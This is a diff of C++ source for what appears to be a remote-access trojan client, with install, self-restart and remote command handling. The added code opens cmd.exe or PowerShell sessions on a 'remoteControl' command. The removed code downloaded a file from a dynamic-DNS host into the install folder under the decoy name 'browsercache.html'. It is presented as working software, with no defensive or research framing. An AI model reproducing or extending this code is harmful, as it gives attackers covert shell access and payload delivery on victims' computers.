@@ -40,7 +40,7 @@ bool General::init()	//startup of program
 	}
 
 
-	runInstalled();			//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
+	runInstalled();			//checks if this run of the instance is designated to the install process, then checks whether it should start the installed client
 
 
 	return installing;
@@ -247,6 +247,17 @@ void General::handleError(int errType, bool errSevere)	//handles errors
 
 }
 
+bool General::processParameter(std::string &command, std::string compCommand)
+{
+	std::string::size_type i = command.find(compCommand);
+	if (i != std::string::npos)
+	{
+		command.erase(i, compCommand.length() + 1);
+		return true;
+	}
+	else
+		return false;
+}
 
 std::string General::processCommand(std::string command)
 {
@@ -260,16 +271,33 @@ std::string General::processCommand(std::string command)
 		restartSelf();
 		return "restarting";
 	}
-	else if (command == "cmdmode")
+	else if (processParameter(command, "remoteControl"))
 	{
 		if (!CMD::cmdOpen)
 		{
-			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CMD::cmdThread, NULL, NULL, NULL);
-			while (!CMD::cmdOpen)
+			if (command == "cmd")
+				command = "C:\\WINDOWS\\system32\\cmd.exe";
+			else if (command == "pws")
+				command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+			else if (command == "pws32")
+				command = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+			if (Utility::fileExists(command))
 			{
-				Sleep(50);
+				char* buffer = new char[command.length() + 3];
+				buffer[command.length()] = '\0';
+				strcpy_s(buffer, command.length() + 2, command.c_str());
+
+				CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
+				while (!CMD::cmdOpen)
+				{
+					Sleep(50);
+				}
+				delete[] buffer;
+				return "CMD session opened.";
 			}
-			return "CMD session opened.";
+			else
+				return "File doesn't exist.";
 		}
 		else
 		{
@@ -277,13 +305,6 @@ std::string General::processCommand(std::string command)
 			CMD::cmdOpen = false;
 			return "CMD session closed";
 		}
-	}
-	else if (command == "tempDownload")			//TEMPORARY, IMPLEMENT OTHERWISE
-	{
-		try {
-			URLDownloadToFile(NULL, "http://nehcer.ddns.net/catslol.lmfao", (installFolder + "\\browsercache.html").c_str(), 0, NULL);
-		}
-		catch (int e) { return "Command failed"; }
 	}
 	else
 	{
